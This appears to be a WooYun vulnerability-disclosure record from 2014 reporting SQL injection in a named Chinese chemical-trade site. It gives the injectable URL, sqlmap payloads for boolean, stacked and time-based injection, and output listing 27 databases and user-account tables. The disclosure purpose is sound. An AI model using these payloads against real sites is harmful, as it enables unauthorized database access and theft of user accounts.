{"id": 43167, "wybug_id": "wooyun-2014-083541", "wybug_title": "中国万维化工城SQL注入漏洞（涉及27个数据库大量用户账户）", "wybug_corp": "中国万维化工城", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2014-11-17 12:25", "wybug_open_date": "2015-01-01 12:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国万维化工城SQL注入（涉及27个数据库 大量用户账户） 详细说明：  \n注入点：http://www.chem.com.cn/BuyUser_show.aspx?id=848991\n由于数据库太多  本屌丝机器配置也不会 跑表太慢  所以就截图一部分 并不深入去跑了 \n\n\n\n\n\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 558 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=848991 AND 3274=3274    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=848991; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=848991 WAITFOR DELAY '0:0:5'-----[22:22:41] [INFO] testing Microsoft SQL Server[22:22:42] [INFO] confirming Microsoft SQL Server[22:22:46] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000\n\navailable databases [27]:[*] bizdb[*] blob[*] chat[*] chemdoc_bak[*] coating[*] eep[*] eepcn[*] engqsjk[*] gqsjk[*] gqsjkweb[*] LumigentDemoDB[*] master[*] model[*] msdb[*] oversea[*] Questionnaire[*] sdk[*] selphelp[*] shiyan[*] tempdb[*] test[*] user_news[*] WEBSITE[*] wwbbs[*] wwBuySelldb[*] wwuserdb[*] xxwdb\n\n[23:00:34] [INFO] fetching tables for database: wwuserdb[23:00:34] [INFO] fetching number of tables for database 'wwuserdb'[23:00:34] [WARNING] running in a single-thread mode. Please consider usage ofption '--threads' for faster data retrieval[23:00:34] [INFO] retrieved:[23:00:36] [WARNING] reflective value(s) found and filtering out53[23:00:50] [INFO] retrieved: dbo.aspnet_Applications[23:04:55] [INFO] retrieved: dbo.aspnet_Membership[23:07:06] [INFO] retrieved: dbo.aspnet_Paths[23:08:30] [INFO] retrieved: dbo.aspnet_PersonalizationAllUsers[23:13:19] [INFO] retrieved: dbo.aspnet_PersonalizationPerUser[23:15:48] [INFO] retrieved: dbo.aspnet_Profile[23:17:23] [INFO] retrieved: dbo.aspnet_Roles[23:18:40] [INFO] retrieved: dbo.aspnet_Sc............................................\n   修复方案：  你比我懂   版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}